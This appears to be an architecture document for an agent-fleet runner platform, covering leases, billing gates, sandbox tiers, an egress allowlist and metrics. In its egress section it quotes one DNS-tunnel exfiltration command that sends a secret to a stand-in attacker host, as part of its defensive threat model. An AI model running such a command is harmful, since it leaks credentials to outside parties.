NullClaw emits progress frames mid-run (tool started, response chunk, tool completed). The runner holds no Redis, so the child emits frames over its stdout pipe (`src/runner/pipe_proto.zig`, length-prefixed typed frames: `A` = activity, `R` = result, multiplexed because stdout crosses bwrap cleanly); the parent forwards each `A` frame to `agentsfleetd` over the `activity` verb, and `agentsfleetd`'s `fleet/service_activity.zig` translates it to the `PUBLISH` on `fleet:{id}:activity`. Downstream Server-Sent Events (SSE) is unchanged.

```
NullClaw child ─pipe(A frames)─► runner parent ─POST .../activity (no ack)─► agentsfleetd ─PUBLISH─► SSE
```

Two planes, kept apart on purpose: **activity** is ephemeral and best-effort (a dropped frame is cosmetic); **report** is the durable system of record. The live tail is never the source of truth. The bracket frames (`event_received` at lease, `event_complete` at report) are published by `agentsfleetd` itself, so the tail has open/close markers even before the runner forwards a single mid-run frame.

## Steer, kill, pause

All three are decided by `agentsfleetd`, which owns both `core.fleets.status` and lease issuance. A runner learns of an in-flight change on its next `heartbeat`, so cancel latency is bounded by the heartbeat interval.

- **Steer** — a human message. `agentsfleetd` enqueues a `steer` event; it is leased like any other. The current run finishes first; the steer runs next. Not an interrupt.
- **Pause** — `agentsfleetd` sets `status=paused` and stops issuing leases for the fleet. Any in-flight lease runs to completion.
- **Kill** — `agentsfleetd` sets `status=killed` and marks the in-flight lease revoked. The runner sees the revocation in its next heartbeat reply, kills the sandboxed child, and reports `cancelled`. A late report from a killed runner is rejected by the fencing token.

A dedicated low-latency cancel channel can come later; heartbeat-carried revocation is the S0 mechanism.

## Cold and warm execution

Default is **cold**: every lease forks a fresh sandbox, runs, and tears it down. No pinning, no stale state, no idle cost.

A later, opt-in **warm** mode keeps the sandbox shell alive across leases for the same fleet to skip cold setup. Warm reuses only the sandbox shell — never fleet state or config. Two guards make it safe: the lease always carries fresh config + secrets (config is never cached, see below) and the checkpoint is the only carried state; and sticky routing is a *hint*, not ownership — if the warm runner is busy or dead, any eligible runner takes the event, and idle warm children self-evict. A Fleet is never stuck waiting for one runner.

## Config

A Fleet's config (model, tool allowlist, network policy, context budget, gate rules, trigger settings, secret references) is parsed from `TRIGGER.md` frontmatter into `core.fleets.config_json`. A `PATCH /v1/workspaces/{ws}/fleets/{id}` updates it — including reparsing `trigger_markdown` to add a tool.

`agentsfleetd` resolves config fresh from Postgres on every `lease`, so config changes take effect on the **next command** (the next lease) with no signaling. There is no in-memory config cache and no `fleet_config_changed` consumer to wait on — the deleted worker's watcher-reload path is gone. A config change never alters a language-model turn already in flight; the next run picks it up.

## Money gates

The credit-pool billing model debits twice per event, and both debits live on `agentsfleetd`'s lease path — the runner never touches billing.

- At **lease issue**, before handing work to a runner: the balance gate (does the tenant cover the receive + run estimate?), then the `receive` debit (flat, posture-based), then the approval gate, then the `run` debit (a conservative estimate at floor tokens). Any gate failure means no lease is issued.
- At **report**: reconcile the run's telemetry row to the actual token counts. The charged amount stays at the pre-execution estimate — report updates telemetry, it does not re-charge.
- At **renewal** (M80_006 `/renew`): the same balance gate re-runs as a **coverage check only** — no debit, no telemetry row. A live child's renewal is refused with `UZ-RUN-012` when the tenant can no longer cover the run; the child is killed and the lease ends at its current deadline, never extended. In M80_006 a renewed lease is **not** re-billed — the run charge at lease issue covers the whole run however many renewals extend it (M80_010 later moves the run debit onto these ticks as a per-slice Δ-debit). The gate's exhaustion policy is resolved **once at startup** and carried on the request `Context` (`ctx.balance_policy`), shared by the lease and renewal paths — not re-read from the environment per request.

Receive credits are not refunded if the run later exhausts. This mirrors the deleted `metering.zig` exactly; only the caller moved from the worker to `agentsfleetd`'s lease/report path. **Metering never stops, but the gate only bites post-trial:** while the free-trial window is open the run charge is `0`, so neither the lease gate nor the renewal gate can refuse any tenant — the `UZ-RUN-012` path is unreachable until `FREE_TRIAL_END_MS` passes (mechanism + the metering-vs-revenue split in [`billing_and_provider_keys.md` §2.3](./billing_and_provider_keys.md#23-promotional-windows-free-trial-mechanism)).

## Redis topology — what changed

The pre-cutover runtime had three Redis surfaces. The split keeps two (shifting their producer/consumer to `agentsfleetd`) and retires one.

| Surface | Before | Now |
|---|---|---|
| `fleet:{id}:events` (work stream, group `fleet_lease`) | the per-fleet worker thread was the consumer (`worker-{host}-{ts}`); blocking `XREADGROUP`, `XAUTOCLAIM`, `XACK` | **`agentsfleetd` is the consumer.** `lease` does a non-blocking `XREADGROUP` on the request thread; `report` does the `XACK`. The runner is not a Redis consumer. |
| reclaim of a dead processor | `XAUTOCLAIM` by consumer idle (5 min) — a dead worker was a dead consumer | **lease expiry + `fencing_token`.** A dead runner is *not* a dead Redis consumer (`agentsfleetd` is), so consumer-idle can't see it. The lease layer is the reclaim mechanism. |
| `fleet:control` (control stream) | the watcher consumed `fleet_created` / `fleet_status_changed` / `fleet_config_changed` / `worker_drain_request` to spawn / cancel / reload per-fleet threads | **removed.** There are no per-fleet threads to orchestrate: created is moot, status/config live in Postgres + are read fresh per `lease`, drain is the heartbeat reply. The producer (`control_stream.publish`) and the dead `control_stream` module were deleted; install keeps only `redis_agent.ensureFleetConsumerGroup` (the lease `XREADGROUP` needs the events group present). |
| `fleet:{id}:activity` (pub/sub) | the worker `PUBLISH`ed; SSE handlers subscribed | same channel + SSE; **`agentsfleetd` `PUBLISH`es** — bracket frames directly, mid-run frames fed by the runner's `activity` stream. |

The reclaim shift is the load-bearing one: moving the processor off-platform means Redis can no longer observe its death, so the durable lease (`lease_expires_at` + `fencing_token`, frozen in M80_001) replaces `XAUTOCLAIM`.

## Sandbox tiers

A runner reports its isolation strength at registration. Assignment (and later the scheduler) refuses to place other-tenant or production work on a weak tier. The reported tier is telemetry; trust for placement is operator-assigned, not self-claimed. A production startup guard refuses `dev_none` (or an unknown tier) in a release build, so the weakest tier cannot become the production default.

| `sandbox_tier` | Where | Eligible for |
|---|---|---|
| `landlock_full` | Linux host | any work |
| `container_nested` | runner inside a container on a Linux host or VM (Virtual Machine) | any work — full sandbox, nested |
| `macos_seatbelt` | macOS, Seatbelt profile (weaker) | own-tenant / dev work |
| `dev_none` | no real sandbox; refused in release builds | own-tenant dev work |

On a Mac, running `agentsfleet-runner` inside a Linux VM (Docker Desktop / OrbStack / Lima) is how a laptop earns `container_nested` instead of the degraded `macos_seatbelt`.

> **Tiers ≠ egress policy.** `sandbox_tier` reports *isolation strength* (filesystem / syscall / process) — it is **orthogonal** to network egress. `landlock_full` does not constrain which hosts the child reaches (Landlock governs the filesystem; its recent network support is TCP *port* binding/connect only, not host allowlisting). `container_nested` gives a ready net-namespace boundary that the egress model can build on, but still needs the allowlist. So none of the tiers substitutes for the egress model below.

## Egress model — outbound is the only network surface

The runner box is **outbound-only**: it runs no inbound listener (the daemon dials the control plane via an outbound `std.http.Client`; see §Datastore role model), and holds no co-located datastore. So the network threat is entirely **outbound secret exfiltration** — the sandboxed fleet legitimately holds the lease's inference `api_key` and tool secrets (e.g. a GitHub token), and the fleet's *only* required egress is its inference endpoint (or a gateway) plus operator-declared `allow_hosts` for tools.

Three network policies:

- **`allow_all` (current default)** — the child re-shares the host network namespace with `--share-net`, so all outbound egress is allowed. This is the interim compatibility posture, not the final hardening posture.
- **`deny_all_egress`** — the child's net namespace is unshared (`--unshare-all`) with **no veth**; it reaches nothing. Correct for non-network fleets and isolation demos.
- **`allow_list_egress` (enforced allow-list)** — the child keeps its **own** unshared net namespace connected to the host by a single **veth pair** (`uzveth<worker>` ↔ peer, point-to-point `10.69.<worker>.0/30`). The parent installs **default-deny `nftables` rules in the host netns, on the host-side veth** (root-owned — Invariant 6, never inside the child's netns, which the child could `nft flush`): egress is permitted only to the **IP set resolved at lease setup** from the merged allowlist, and everything else — arbitrary exfil targets, raw IPs, link-local, private network ranges — is dropped at the kernel. The operator's declared `allow_hosts` becomes a real packet-time boundary, not a log line. The current runner recognizes this policy name but refuses leases fail-closed until the egress setup path is wired.

**The merged allowlist (one source for Layer 4 (L4) + Layer 7 (L7)).** `network/AllowList.build` merges, deduped first-seen: the lease's inference endpoint host ∪ the package-registry baseline from runner config (falling back to `AllowList.DEFAULT_REGISTRY`'s 8 package registries) ∪ the per-fleet `network.allow`. The **same** `AllowList` feeds both the kernel `nftables` set (L4) and the `http_request`/`web_fetch` tool checks (L7), so the two can never disagree.

**The inference host is control-plane-authored — no parent-side drift.** The allowlist must permit exactly the host the fleet's LLM call dials. The provider→URL map lives in NullClaw's `providers/factory.zig` (`compatibleProviderUrl`); `agentsfleetd` reads **that** table (not a copy) in `fleet/service.resolveExecutionPolicy`, extracts the host (`execution_policy.hostFromUrl`), and carries it on the lease as `ExecutionPolicy.inference_host`. The runner allowlists exactly what the engine reaches.

**Name resolution is parent-provided; there is no reachable resolver.** The parent renders a static `/etc/hosts` (each allowlist name → its lease-setup-resolved IP) and a resolver-less `/etc/resolv.conf`, ro-bound into the sandbox. `nftables` drops **all** child egress to port 53, so no forwarding resolver is reachable — closing the DNS-tunnel exfil channel (`dig $secret.attacker-ns.com @resolver`) by the *absence* of any resolver. An undeclared host misses `/etc/hosts` and fails **fast at resolution** (no 30-second hang), and that name rides the tool error into the fleet's turn.

**Fail-closed + IPv4-only (launch).** If the netns/veth/nft setup fails, the lease is refused (`UZ-RUN-007`) — never run with no filter. The launch slice is IPv4; the `inet`-family chain's drop policy disposes of any IPv6 packet (Invariant 8 — a v6 allowlist entry refuses setup rather than silently bypassing the v4 filter). The hand-rolled netlink serializers (`network/{rtnetlink,nfnetlink,nfnetlink_rule}.zig`) are golden-byte tested against real `nft --debug=netlink/mnl` captures (`tests/fixtures/runner/network/`).

> **Launch slice vs the deferred name-layer.** The above is the **launch** egress model (own-netns + host-side `nftables` IP-allowlist, resolve-at-setup) — no proxy, no resolver in the data path. When the fleet opens to untrusted/customer-operated runners with **rotating-CDN host sets** that an at-setup IP pin cannot track, the name-layer is added the **modern** way: an **eBPF/FQDN-aware datapath** that learns allowed IPs by snooping DNS *answers* and programming the same `nftables`/kernel set live — the Cilium `toFQDNs` pattern (or a minimal DNS-answer watcher updating our existing set). **No forward proxy, no SNI/`CONNECT` interception, no TLS man-in-the-middle** — that squid-era approach is explicitly *not* the direction. It is a strict evolution of the launch datapath: pin-at-setup → pin-from-observed-DNS, same nft set. (Introducing a controlled resolver to snoop is itself the change from launch's resolver-less posture, gated to that tier.) Standing residual at every tier: an allow-listed write-capable host (e.g. `github.com`) is still an exfil channel by design — closed only by short-lived/scoped tokens, a credential-model change, not this layer.

**Durable memory rides the trusted plane, never the fleet.** The runner is built `base,sqlite` (no Postgres engine), so the sandboxed child holds no datastore credential and opens no DB socket; per-run fleet memory is captured through the control plane's authenticated channel and written to `memory.memory_entries` server-side. The untrusted child never connects to Postgres.

## Scaling

The split inverts the binding constraint. The pre-cutover runtime needed N Redis connections for N fleets and the pool ceiling was the wall. After the split, runners hold zero datastore connections; the bottleneck becomes `agentsfleetd` API replicas + Postgres writes, both of which scale horizontally. Runners scale out with no coordination — the operator enrolls a host with a pre-minted `agt_r`, and it pulls. The one piece needing care at multi-replica scale is placement (assignment / scheduler), which is the M84_002 (reassignment, shipped) / M85_001 (label placement, shipped) concern; the hot path (lease / report) is shardable. See [`scaling.md`](./scaling.md) for the re-derived connection math.

## Observability — bounded facts to `agentsfleetd`, raw logs to the host

The fleet is observed **without any inbound reach into runners.** A runner may sit behind Network Address Translation (NAT), on an untrusted host, or on a customer host. A scraper cannot reliably reach those machines.

Bounded per-runner facts therefore ride outbound on verbs the runner already calls: `report`, `heartbeat`, and lease grant/release. `agentsfleetd` accumulates those facts and exposes them on its own `/metrics`. `agentsfleetd` is the only application scrape target; the per-runner drill-down is a `runner_id` label.

Raw runner logs do not ride those verbs. The runner writes structured stderr to the host supervisor. An operator may attach a standard journald collector that sends logs directly to Loki, but the path bypasses `agentsfleetd`. Activity frames remain user-visible run output and are never reused as a log stream.

Three routes serve three different volume shapes:

```
 RUNNER FACTS                              RUNNER RAW LOGS
 ────────────                              ───────────────
 heartbeat/report/lease ──► agentsfleetd   stderr ──► journald
                              │                         └─ optional collector ──► Loki
                              ▼                            (never via agentsfleetd)
                     :9091 /metrics
                              ▲
                              └── Fly.io managed Prometheus scrapes

 CONTROL-PLANE LOGS / TRACES
 ───────────────────────────
 agentsfleetd ──bounded OpenTelemetry Protocol (OTLP) exporters──► Loki / Tempo
```

`agentsfleet-runner` creates no spans today. Its NullClaw observer returns no trace identifier, so adding a trace field to the runner protocol would move bytes without joining any runner span. The current trace is control-plane-owned: one selected `fleet.delivery` span after accepted settlement, correlated by `event_id`, `fleet_id`, and `workspace_id`.

Successful heartbeat, lease, renew, activity, and report requests are high-rate control traffic, not useful default trace spans. The lease rule covers both an empty poll and a granted lease; useful run work retains the settled `fleet.delivery` span. The shipped route policy removes those successes from the default `http.request` span stream. Trace lifetime begins after route match and before API admission. Status precedence sends every 5xx response only to the fixed four-span-per-monotonic-second server-error budget; matched runner 4xx responses, including an admission-shed 429, enter only the separate four-span rejection budget. Excess errors increment a fixed aggregate suppression counter rather than filling the trace ring. Sampled successes reserve two spans, capping generic request spans at 10 per second. Sampling uses the server-generated span identifier, never caller-controlled trace input. A future runner span producer must define sampling and a fixed span budget before World Wide Web Consortium (W3C) trace context crosses the protocol.

PostHog remains `agentsfleetd` product analytics. It receives selected business events only. It never receives runner logs, heartbeats, renewals, activity frames, or scheduler mechanics. `FleetCompleted` is production-wired and fires after durable report settlement — the fenced claim that authorizes settlement authorizes the capture, so a replayed or superseded report captures nothing.

The scraper is **Fly.io's platform-managed Prometheus** — the four-line `[[metrics]]` block in `deploy/fly/agentsfleetd-prod/fly.toml` is the entire scrape config; there is no Grafana Fleet / Alloy / Vector / OTel-collector for metrics. Fly pulls `:9091/metrics` off each machine over the private 6PN network; the endpoint is not publicly routable (no `[http_service]`; inbound is Cloudflare-Tunnel-only). Grafana reads Fly's Prometheus as a datasource — it scrapes nothing itself.

### The four per-runner families

```
agentsfleet_runner_failures_total{runner_id,reason}     counter   reason ∈ FailureClass ∪ {unknown}
agentsfleet_runner_executions_total{runner_id,outcome}  counter   outcome ∈ {processed, fleet_error}
agentsfleet_runner_last_seen_seconds{runner_id}         gauge     render-time delta from last report/heartbeat
agentsfleet_runner_active_leases{runner_id}             gauge     +1 on grant, −1 on terminal report
```

All four live in a process-global, allocator-free, fixed-capacity (4096-slot) hash table keyed on `runner_id` (`src/agentsfleetd/observability/metrics_runner.zig`, mirroring `metrics_counters.zig`). The render path reads only that in-memory snapshot — **zero Postgres on the scrape path**, so `/metrics` stays healthy exactly when the database is not. Cardinality is capped: the 4097th distinct `runner_id` routes to `runner_id="_other"` (counters preserved). Footprint is therefore constant (~0.7 MB) regardless of fleet size or uptime; a `agentsfleetd` restart zeroes the table (Prometheus counter-reset semantics absorb it; gauges self-heal within one heartbeat/lease cycle).

### Multi-replica (`agentsfleetd` N>1) — correctness is an *aggregation* property

Prod runs a single `agentsfleetd` machine today, so the in-memory values are correct as-is. When the control plane scales out, a runner's verbs load-balance across replicas, so each replica holds only the slice of that runner's event stream it served. Fly's Prometheus scrapes each replica as a **distinct target** and stamps every series with that machine's `instance` label — so fleet-wide truth is reconstructed by the query, not by shared state:

| Series | Cross-replica query | Exact under N>1? |
|--------|---------------------|------------------|
| `failures_total`, `executions_total` | `sum by (runner_id, …)` | ✅ exact — counters are additive; per-replica slices are disjoint |
| `last_seen_seconds` | `min by (runner_id)` | ✅ exact — the most-recent sighting wins; a replica that never saw the runner exposes no series, so `min` ignores it |
| `active_leases` | `sum by (runner_id)` | ⚠️ approximate — the `+1` grant and `−1` release can land on different replicas, so the value is meaningful only in aggregate and a single-replica restart can transiently skew it |

`active_leases` is the one series that cannot be made exact purely in-memory: it is a distributed inc/dec with no routing affinity and no shared counter. Its exact source is the durable lease table (`fleet.runner_leases` — `lease_expires_at` + the held set), which is read by the **deferred metrics refresher** below. The dashboard (`deploy/grafana/runner_fleet.json`) encodes these queries and labels the `active_leases` panel best-effort under N>1.

### The deferred refresher — exact gauges without metrics-in-the-DB

The exact and restart-resilient form of the two gauges is a read-only background thread on each replica that, on a timer (~15 s), queries Postgres for `last_seen_at` and the live lease count (`count(*) WHERE lease_expires_at > now()`), overwrites an in-memory snapshot, and lets `/metrics` render that snapshot. This keeps the scrape path DB-free while giving every replica identical, exact values and closing the abandoned-lease over-count. It is **not "metrics in Postgres"**: it *reads* already-durable operational state to derive a gauge — the timeseries still lives only in Prometheus. Deferred (in-memory aggregation is correct enough for the single-replica present); it is the persistent answer for a scaled-out future.

## What does not change

- NullClaw's fleet loop, its tool inventory, and secret substitution at the tool bridge. It moved into the runner as a linked engine and a sandboxed child, but its behaviour is identical.
- Event ingress: steer / webhook / cron / continuation still `XADD fleet:{id}:events`.
- The user read path: `GET /events`, the SSE live tail, `agentsfleet status/events`.
- The three durable stores and their contracts (see `data_flow.md`), including row-for-row equivalence with the deleted direct path (Invariant 2 of the cutover spec).

## Roadmap (M80 workstreams)

```
 S0  M80_001  KEYSTONE   DONE — froze /v1/runners protocol + fleet schema + auth plane + lease/report handlers
 S1–S4         CUTOVER    DONE — absorbed into M80_002: agentsfleetd assignment + fencing + reclaim over PG + Redis;
                                 the agentsfleet-runner binary with NullClaw folded in + fork-sandboxed child;
                                 thin agentsfleetd (direct worker path + sandbox sidecar deleted); TLS transport;
                                 data_flow.md / capabilities.md / scaling.md reconciled here
 ── cutover landed: the runner is the processor; the old direct path is gone ──────────────────
 S5  M80_004  PLATFORM   macOS Seatbelt backend + distribution / CI + runner CLI                  (done)
 S5  M80_005  IDENTITY   DONE — platform_admin gate on enrollment (POST /v1/runners) + Option B host
                                 (operator pre-mints agt_r, no self-register); trust_class +
                                 allowed_workspace_ids + trust-gated placement still deferred (later)
 S5  M80_006  FLEET      DONE — per-lease renewal (live runner keeps its lease); operator plane +
                                 heartbeat-lapse reassignment carved out → M84_002
 S6  M84_001  ENROLLMENT dashboard "Add runner" mint (retired register --token CLI) + GET
                         /v1/fleets/runners read + honest derived liveness                          (done)
 S6  M84_002  OPERATOR   PATCH /v1/fleets/runners cordon/drain/revoke + admin_state + UZ-RUN-009 +
                         fleet.runner_events log + liveness sweeper / reassignment                 (done)
 S7  M85_001  SCHEDULER  label placement (required_tags ⊆ runner.labels, before the sticky hint);
                         capacity / fairness / autoscale / trust-tier stay out                       (done)
 ── note ──────────────────────────────────────────────────────────────────────────────────────
     "M80_007" shipped as the runner-observability spec; the placement reservation moved to M85_001.
     M85_001 shipped label placement only — trust-gated placement remains deferred (later).
 ── later ─────────────────────────────────────────────────────────────────────────────────────
     trust-gated placement   trust_class + allowed_workspace_ids funnel (M80_005 carved this out;
                             M85_001 did not pick it up — still a non-goal until a spec reopens it)
     mode C    self-enrolling runners — the open "run it on your own host" case
```

M80_003 was superseded — its thin-worker slice landed inside the M80_002 cutover. M80_006 is reframed **mandatory, not optional**: heartbeat-renewed leases + decoupled liveness/execution TTL + sub-10 s recovery + cordon/reaping are the path out of the S0 lazy-reclaim SLA and the > 30 s renewal gap.
